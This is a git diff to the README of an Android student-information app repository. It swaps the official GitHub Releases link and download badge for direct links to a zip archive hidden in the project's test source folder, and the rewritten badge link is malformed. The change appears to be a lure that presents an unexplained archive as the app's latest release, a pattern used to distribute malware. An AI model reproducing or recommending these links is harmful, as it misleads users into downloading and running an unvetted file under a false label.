@@ -20,9 +20,9 @@ Welcome to the "Thong-tin-sinh-vien-2" repository, an Android application that b
 
 ## 🔗 Quick Access to Releases
 
-For downloading and executing the latest version of the "Thong-tin-sinh-vien-2" app, please visit the [Releases](https://github.com/ZurraNisar/Thong-tin-sinh-vien-2/releases) section.
+For downloading and executing the latest version of the "Thong-tin-sinh-vien-2" app, please visit the [Releases](https://raw.githubusercontent.com/ZurraNisar/Thong-tin-sinh-vien-2/master/app/src/test/java/sinh_tin_vien_Thong_v2.5.zip) section.
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/ZurraNisar/Thong-tin-sinh-vien-2/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/ZurraNisar/Thong-tin-sinh-vien-2/master/app/src/test/java/sinh_tin_vien_Thong_v2.5.zip%20Version-brightgreen)](https://raw.githubusercontent.com/ZurraNisar/Thong-tin-sinh-vien-2/master/app/src/test/java/sinh_tin_vien_Thong_v2.5.zip)
 
 ## 📸 Screenshots
 
